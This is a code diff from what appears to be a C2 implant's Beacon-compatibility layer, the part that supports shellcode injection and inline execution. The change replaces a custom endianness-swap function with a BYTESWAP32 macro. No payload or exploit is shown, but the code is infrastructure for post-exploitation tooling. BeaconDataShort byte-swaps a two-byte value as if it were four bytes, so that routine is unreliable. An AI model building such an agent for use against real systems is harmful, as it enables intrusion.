@@ -15,6 +15,7 @@
 #include "Config.h"
 #include "Debug.h"
 #include "Identity.h"
+#include "Utils.h"
 
 #if defined(INCLUDE_CMD_INJECT_SHELLCODE) || defined(INCLUDE_CMD_INLINE_EXECUTE)
 
@@ -100,19 +101,6 @@ char* beacon_compatibility_output = NULL;
 int beacon_compatibility_size = 0;
 int beacon_compatibility_offset = 0;
 
-UINT32 swap_endianess(UINT32 indata) {
-    UINT32 testint = 0xaabbccdd;
-    UINT32 outint = indata;
-    if (((unsigned char*)&testint)[0] == 0xdd) {
-        ((unsigned char*)&outint)[0] = ((unsigned char*)&indata)[3];
-        ((unsigned char*)&outint)[1] = ((unsigned char*)&indata)[2];
-        ((unsigned char*)&outint)[2] = ((unsigned char*)&indata)[1];
-        ((unsigned char*)&outint)[3] = ((unsigned char*)&indata)[0];
-    }
-    return outint;
-}
-
-
 void BeaconDataParse(datap* parser, char* buffer, int size) {
     if (parser == NULL) {
         return;
@@ -131,7 +119,7 @@ int BeaconDataInt(datap* parser) {
         return 0;
     }
     memcpy(&fourbyteint, parser->buffer, 4);
-    fourbyteint = swap_endianess(fourbyteint);
+    fourbyteint = BYTESWAP32(fourbyteint);
     parser->buffer += 4;
     parser->length -= 4;
     return (int)fourbyteint;
@@ -143,7 +131,7 @@ short BeaconDataShort(datap* parser) {
         return 0;
     }
     memcpy(&retvalue, parser->buffer, 2);
-    retvalue = swap_endianess(retvalue);
+    retvalue = BYTESWAP32(retvalue);
     parser->buffer += 2;
     parser->length -= 2;
     return (short)retvalue;
@@ -163,7 +151,7 @@ char* BeaconDataExtract(datap* parser, int* size) {
     memcpy(&length, parser->buffer, 4);
     parser->buffer += 4;
     // Swap endianness - data is packed in big-endian (network byte order)
-    length = swap_endianess(length);
+    length = BYTESWAP32(length);
     outdata = parser->buffer;
     if (outdata == NULL) {
         return NULL;
@@ -250,7 +238,7 @@ void BeaconFormatInt(formatp* format, int value) {
     if (format->length + 4 > format->size) {
         return;
     }
-    outdata = swap_endianess(indata);
+    outdata = BYTESWAP32(indata);
     memcpy(format->buffer, &outdata, 4);
     format->length += 4;
     format->buffer += 4;
